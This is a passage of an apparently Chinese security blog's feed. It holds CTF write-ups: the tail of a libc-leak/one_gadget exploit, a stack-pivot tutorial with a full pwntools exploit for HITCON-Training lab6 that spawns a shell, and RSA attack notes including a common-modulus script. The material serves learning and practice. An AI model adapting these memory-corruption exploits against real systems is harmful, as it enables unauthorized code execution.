class="comment">#039;\0&amp;#039;))-libc.symbols[&amp;#039;puts&amp;#039;]</span></span><br><span class="line">info(&amp;quot;one:&amp;quot;+<span class="built_in">hex</span>(libc_base+one_gadget))</span><br><span class="line"></span><br><span class="line">pay=&amp;<span class="comment">#039;a&amp;#039;*0x60+p64(0xdeadbeef)+p64(one_gadget+libc_base)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> i春秋 </tag>
            
            <tag> 新春战疫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移学习（旧）</title>
      <link href="archives/f3d2f4dc/"/>
      <url>archives/f3d2f4dc/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>栈迁移可以解决栈溢出后，没有足够空间写入 payload 的情况。主要通过 伪造 ebp ，并利用 leave|ret gadget 劫持栈到预设位置。</p><blockquote><p>leave | ret == mov ebp,esp;pop ebp;ret</p></blockquote><h2 id="HITCON-Training-master-lab6"><a href="#HITCON-Training-master-lab6" class="headerlink" title="HITCON-Training-master lab6"></a><a href="https://github.com/scwuaptx/HITCON-Training">HITCON-Training-master lab6</a></h2><h3 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h3><p>程序为32 位打开 NX 防护：</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200305221400.png"></p><p>运行程序，提示输入，输入后退出程序：</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200305221521.png"></p><p>main 函数 read 存在栈溢出，可溢出长度为 0x40 - 0x28 ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-28h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( count != <span class="number">0x539</span> )</span><br><span class="line">    exit(<span class="number">1</span>);</span><br><span class="line">  ++count;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  puts(<span class="string">&quot;Try your best :&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, 0x40u);//栈溢出</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在可以溢出操作的空间很小，可以考虑使用栈迁移，当然你能找到超短的 shellcode 也可以。能不能进行 ROP ，emmm 需要修改 count 防止退出程序。那就用栈迁移吧。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a><strong>利用思路</strong></h3><p><em>我们可以利用溢出 eip 调用 read 在劫持前，写入伪造栈空间内容（执行什么命令、有什么变量、伪造栈的ebp等）</em></p><p>伪造 ebp 劫持当前栈到另外一个地方 stack 1 ；然后在 stack 1 泄露出 libc 基地址，并再次伪造 ebp 劫持当前栈到另外一个地方 stack 2；调用 system(‘/bin/sh’) 。</p><p><strong>第一步</strong></p><p>我选择将当前栈 stack 0 ，劫持到内存地址为 bss+0x200 的stack 1。为什么是 bss+0x200 ？一开始劫持到 bss 报错，然后就选择高点的地址就成功了。</p><p>我们迁移栈之后，栈总不能是空的，什么都不执行就退出了，所以在这一步需要控制 stack 0 的 eip 调用 read ，写入 stack 1 的栈数据。</p><p>大致利用思路里说了，需要第二次迁移栈，所以我们也需要伪造 stack 1 ，以实现在将 stack 1 劫持到 stack 2 。</p><p>payload 0 构造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x28</span> <span class="comment">#填充</span></span><br><span class="line">payload += stack_1 <span class="comment">#伪造ebp</span></span><br><span class="line">payload += read_plt <span class="comment">#调用read</span></span><br><span class="line">payload += leave_ret <span class="comment">#利用gadget将ebp赋值esp完成栈迁移</span></span><br><span class="line">payload += p32(<span class="number">0</span>)+p32(stack_1)+p32(<span class="number">0x100</span>) <span class="comment">#read传参</span></span><br></pre></td></tr></table></figure><p>注意：输入 payload 0 依然在 stack 0 ，停在 read 等待输入状态。我们输入 payload 1 后才栈迁移到 stack 1 。</p><p><strong>第二步</strong></p><p>在这一步需要泄露 libc 基地址，调用一个有输出功能的函数，把某一个函数的真实地址输出出来，然后计算 libc 的偏移。</p><p>这一步还需要进行一次栈迁移，伪造的 ebp 已经在迁移进入 stack 1 前，已经在stack 0 通过 read 写入到 stack 1 的 ebp 位置，所以只需要调用 leave|ret gadget 就可以进行栈迁移。</p><p>既然进行栈迁移，就还是需要提前写入 stack 3 的数据，就需要再次调用 read 。payload 1 先提供一个用于写入stack 2 的 read 函数入口，至于 payload 2 在第三步分析。</p><p>payload 1 构造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(stack_2) <span class="comment">#伪造ebp</span></span><br><span class="line">payload += p32(puts_plt) <span class="comment">#调用输出函数</span></span><br><span class="line">payload += p32(pop_ret) <span class="comment">#返回</span></span><br><span class="line">payload += p32(puts_got) <span class="comment">#函数真实地址</span></span><br><span class="line">payload += p32(read_plt) </span><br><span class="line">payload += p32(leave_ret) <span class="comment">#利用gadget将ebp赋值esp完成栈迁移</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(stack_2) + p32(<span class="number">0x100</span>) <span class="comment">#read传参</span></span><br></pre></td></tr></table></figure><p><strong>第三步</strong></p><p>这一步不需要再栈迁移，因此不需要再伪造 ebp ，用 0x8 数据填充占位即可。最终目的是执行 system(‘/bin/sh’) ，system 地址可以通过查询 libc 后加上偏移得到，/bin/sh 获取有多种方法。可以在 libc 查，可以再次调用 read 输入。</p><p>payload 2 构造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(<span class="number">0x11111111</span>) <span class="comment">#ebp占位</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pop_ret) <span class="comment">#返回</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(stack_1) + p32(<span class="number">0x100</span>) <span class="comment">#传参，将/bin/sh存储在stack1</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(<span class="number">0x22222222</span>) <span class="comment">#system压栈返回地址，垃圾填充即可</span></span><br><span class="line">payload += p32(stack_1) <span class="comment">#/bin/sh\0 地址</span></span><br></pre></td></tr></table></figure><p><strong>栈空间图</strong></p><p>用 read 从 stack esp 写入的时候，各个指令顺序与计算机写入方式有关。假如 read  0x10 数据，会从输入地址向高地址写入 0x10 空间。写入一般为小端序，简单点就是写在前面的，存在后面。输入 ABCD ，录入 0x64636261 。所以 read 中填入命令越前地址越高越先被执行</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200307000025.png"></p><p><strong>完整exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"> </span><br><span class="line">p = process(<span class="string">&#x27;./migration&#x27;</span>)</span><br><span class="line">lib = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./migration&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">read_plt = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">buf = elf.bss() + <span class="number">0x500</span></span><br><span class="line">buf2 = elf.bss() + <span class="number">0x400</span></span><br><span class="line"> </span><br><span class="line">pop1ret = <span class="number">0x804836d</span></span><br><span class="line">pop3ret = <span class="number">0x8048569</span></span><br><span class="line">leave_ret = <span class="number">0x08048418</span></span><br><span class="line"> </span><br><span class="line">puts_lib = lib.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_lib = lib.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">p.recv()</span><br><span class="line"> </span><br><span class="line">log.info(<span class="string">&quot;*********************change stack_space*********************&quot;</span>)</span><br><span class="line">junk = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload = junk + p32(buf) + p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">log.info(<span class="string">&quot;*********************leak libc memory address*********************&quot;</span>)</span><br><span class="line"> </span><br><span class="line">payload1 = p32(buf2) + p32(puts_plt) + p32(pop1ret) + p32(puts_got) + p32(read_plt) + p32(leave_ret)</span><br><span class="line">payload1 += p32(<span class="number">0</span>) + p32(buf2) + p32(<span class="number">0x100</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"> </span><br><span class="line">puts_add = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">lib_base = puts_add - puts_lib</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc base address--&gt;[%s]&quot;</span>%<span class="built_in">hex</span>(lib_base)</span><br><span class="line">system_add = lib_base + system_lib</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system address --&gt;[%s]&quot;</span>%<span class="built_in">hex</span>(system_add)</span><br><span class="line"> </span><br><span class="line">log.info(<span class="string">&quot;*********************write binsh*********************&quot;</span>)</span><br><span class="line">payload3= p32(buf) + p32(read_plt) + p32(pop3ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>) + p32(system_add) + <span class="string">&#x27;bbbb&#x27;</span> + p32(buf)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA加密笔记</title>
      <link href="archives/1e3781ff/"/>
      <url>archives/1e3781ff/</url>
      
        <content type="html"><![CDATA[<h1 id="RSA加密笔记"><a href="#RSA加密笔记" class="headerlink" title="RSA加密笔记"></a>RSA加密笔记</h1><blockquote><p>最后更新：2020-03-02 11:23:12</p></blockquote><h2 id="1-RSA-介绍"><a href="#1-RSA-介绍" class="headerlink" title="1. RSA 介绍"></a>1. RSA 介绍</h2><p>RSA 算法涉及参数有：<code>n、e、d（p、q）</code>，其中分为私钥和公钥。公钥为：<code>n、e</code>，私钥为：<code>phi、d</code>。涉及数学基础有：欧拉函数（phi）、欧几里得算法（gcd）、同余。</p><p><strong>参数介绍</strong>：</p><p><strong>n</strong> ： 两个素数 p 与 q 的乘积。注意：n 将公开，而 p 与 q 不公开。</p><p><strong>e</strong> ：一个素数。满足 <code>1&lt;e&lt;phi</code> ，且 <code>gcd(phi,e)=1</code>（与 phi 最大公约数为 1 ，即互素）。</p><p><strong>phi</strong> ： 欧拉数，计算公式：<code>phi = (p-1)(q-1)</code>。</p><p><strong>d</strong> ： e 模 phi 的逆元，具体关系式：<code>d * e = 1 mod(phi)</code>。</p><h2 id="2-加解密算法"><a href="#2-加解密算法" class="headerlink" title="2. 加解密算法"></a>2. 加解密算法</h2><p>c = m^e mod n = pow(m,e,n)</p><p>m = c^d mod n = pow(c,d,n)</p><h2 id="3-基础加解密脚本"><a href="#3-基础加解密脚本" class="headerlink" title="3. 基础加解密脚本"></a>3. 基础加解密脚本</h2><p>加密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">msg = <span class="string">&#x27;flag is :testflag&#x27;</span><span class="comment"># 明文</span></span><br><span class="line">hex_msg=<span class="built_in">int</span>(msg.encode(<span class="string">&quot;hex&quot;</span>),<span class="number">16</span>)<span class="comment"># 转换明文为数字</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成公钥 n、e</span></span><br><span class="line">p=getPrime(<span class="number">100</span>)<span class="comment"># 随机生成一个质数</span></span><br><span class="line">q=getPrime(<span class="number">100</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">print(<span class="string">&quot;n=&quot;</span>,<span class="built_in">hex</span>(n))</span><br><span class="line">print(<span class="string">&quot;e=&quot;</span>,<span class="built_in">hex</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成私钥 phi、d</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)<span class="comment"># 逆元运算</span></span><br><span class="line">print(<span class="string">&quot;phi=&quot;</span>,<span class="built_in">hex</span>(phi))</span><br><span class="line">print(<span class="string">&quot;d=&quot;</span>,<span class="built_in">hex</span>(d))</span><br><span class="line"></span><br><span class="line"><span class="comment">#加密算法</span></span><br><span class="line">c=<span class="built_in">pow</span>(hex_msg,e,n)</span><br><span class="line">print(<span class="string">&quot;c=&quot;</span>,<span class="built_in">hex</span>(c))</span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 已知 c、n、e ，并分解n获得q、p</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">c=<span class="number">0x534280240c65bb1104ce3000bc8181363806e7173418d15762</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">n=<span class="number">0x80b32f2ce68da974f25310a23144977d76732fa78fa29fdcbf</span></span><br><span class="line"><span class="comment"># 这里使用yafu分解n</span></span><br><span class="line">p=<span class="number">780900790334269659443297956843</span></span><br><span class="line">q=<span class="number">1034526559407993507734818408829</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算私钥</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="comment"># 解密算法</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(<span class="built_in">hex</span>(m)[<span class="number">2</span>:].decode(<span class="string">&#x27;hex&#x27;</span>))<span class="comment"># 转换明文为字符</span></span><br></pre></td></tr></table></figure><p>一般情况下，c e n phi p q c 都是 int 型，m 是 str 型。所以需要将 m 转换为 int 型带入算法进行异或运算。</p><p>我遇到过有两种转换方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法 1 </span></span><br><span class="line">msg=<span class="built_in">int</span>(msg.encode(<span class="string">&quot;hex&quot;</span>),<span class="number">16</span>)</span><br><span class="line">msg=<span class="built_in">hex</span>(msg)[<span class="number">2</span>:].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="comment"># 方法 2 </span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">bytes_to_long(<span class="string">b&#x27;felinae&#x27;</span>)<span class="comment"># bytes 转 int</span></span><br><span class="line">long_to_bytes(<span class="number">28821963924201829</span>)<span class="comment"># 数字转 bytes</span></span><br></pre></td></tr></table></figure><p>求逆元 d 的话，用 gmpy2.invert 代入参数即可。只是 gmpy2 这个库比较难装。</p><h2 id="4-常见攻击方法"><a href="#4-常见攻击方法" class="headerlink" title="4. 常见攻击方法"></a>4. 常见攻击方法</h2><h3 id="4-1-p-与-q-相差过大-小"><a href="#4-1-p-与-q-相差过大-小" class="headerlink" title="4. 1 p 与 q 相差过大(小)"></a>4. 1 p 与 q 相差过大(小)</h3><p>这种情况下，可以利用工具爆破出两个大质数 p 与 q 。通常认为长度在 256 bit 一以下，可以在本地利用工具爆破：</p><ul><li><p>yafu 分解</p><p>windows 下载解压即用，<a href="https://sourceforge.net/projects/yafu/">下载地址</a></p></li></ul><p>长度在 712 bit 以下的，可以到在线网站查询一下是否有已经解密的结果：</p><ul><li><p>在线网站分解</p><p><a href="http://factordb.com/">factordb</a></p></li></ul><h3 id="4-2-有多个公钥-n-且有共用素数因子"><a href="#4-2-有多个公钥-n-且有共用素数因子" class="headerlink" title="4.2 有多个公钥 n 且有共用素数因子"></a>4.2 有多个公钥 n 且有共用素数因子</h3><p>可以尝试**利用公约数分解 n **</p><ul><li><p>利用<strong>欧几里得辗转相除法</strong>求解最大公约数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">   <span class="keyword">if</span> a &lt; b:</span><br><span class="line">     a, b = b, a</span><br><span class="line">   <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">     temp = a % b</span><br><span class="line">     a = b</span><br><span class="line">     b = temp</span><br><span class="line">   <span class="keyword">return</span> a</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    a = <span class="number">38</span></span><br><span class="line">    b = <span class="number">18</span></span><br><span class="line">    print(gcd(a,b))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure></li><li><p>利用<strong>Crypto.Util.number</strong> 库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> GCD</span><br><span class="line">GCD(<span class="number">38</span>,<span class="number">18</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-3-共模攻击"><a href="#4-3-共模攻击" class="headerlink" title="4.3 共模攻击"></a>4.3 共模攻击</h3><p>如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n，也不需要求解私钥的情况下还原出明文m的值。即：<code>当n不变的情况下，知道n,e1,e2,c1,c2 可以在不知道d1,d2的情况下，解出m。</code></p><p>利用的数学公式：<strong>拓展欧几里得算法</strong>。 python 脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#RSA 共模攻击脚本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s, s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展欧几里得算法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">  n = <span class="number">27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657</span></span><br><span class="line">  c1 = <span class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">  c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br><span class="line">  e1 = <span class="number">464857</span></span><br><span class="line">  e2 = <span class="number">190529</span></span><br><span class="line">  s = egcd(e1, e2)</span><br><span class="line">  s1 = s[<span class="number">1</span>]</span><br><span class="line">  s2 = s[<span class="number">2</span>]</span><br><span class="line">  <span class="comment"># 求模反元素</span></span><br><span class="line">  <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line">  <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">  m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">  print(n2s(m))  <span class="comment"># 二进制转string</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure><p>库 <strong>gmpy2.gcdext(e1,e2)</strong>  与脚本定义函数相同。</p><h2 id="5-更全面的学习"><a href="#5-更全面的学习" class="headerlink" title="5. 更全面的学习"></a>5. 更全面的学习</h2><ul><li><a href="https://xz.aliyun.com/t/6459#toc-13">深入浅出RSA在CTF中的攻击套路</a></li><li><a href="https://zhuanlan.zhihu.com/p/76228394">CTF—RSA解密学习指南(三)</a></li><li><a href="https://www.freebuf.com/articles/others-articles/166049.html">RSA加密解密原理深度剖析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF密码学中python库应用</title>
      <link href="archives/9cc5252d/"/>
      <url>archives/9cc5252d/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF密码学中python库应用"><a href="#CTF密码学中python库应用" class="headerlink" title="CTF密码学中python库应用"></a>CTF密码学中python库应用</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul><li><p>取 100 bit 长的随机质数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line">getPrime(<span class="number">100</span>)</span><br></pre></td></tr></table></figure></li><li><p>bytes 与 int 互换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line">bytes_to_long(<span class="string">b&#x27;this4bytes&#x27;</span>)</span><br><span class="line">long_to_bytes(<span class="number">123456789</span>)</span><br></pre></td></tr></table></figure></li><li><p>最大公约数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> GCD</span><br><span class="line">GCD(<span class="number">38</span>,<span class="number">18</span>)</span><br></pre></td></tr></table></figure></li><li><p>是否为素数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime()</span><br><span class="line">isPrime(<span class="number">17</span>)</span><br></pre></td></tr></table></figure></li></ul><h2 id="gmpy2"><a href="#gmpy2" class="headerlink" title="gmpy2"></a>gmpy2</h2><blockquote><p>gmpy2 安装比较麻烦，需要几个额外的运行环境，正常情况下 Ubuntu 没有。详情谷歌百度。</p></blockquote><ul><li><p>初始化一个大整数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> mpz</span><br><span class="line">mpz(<span class="number">0x10</span>)</span><br><span class="line">mpz(<span class="number">1234</span>)</span><br></pre></td></tr></table></figure></li><li><p>乘法逆元</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span 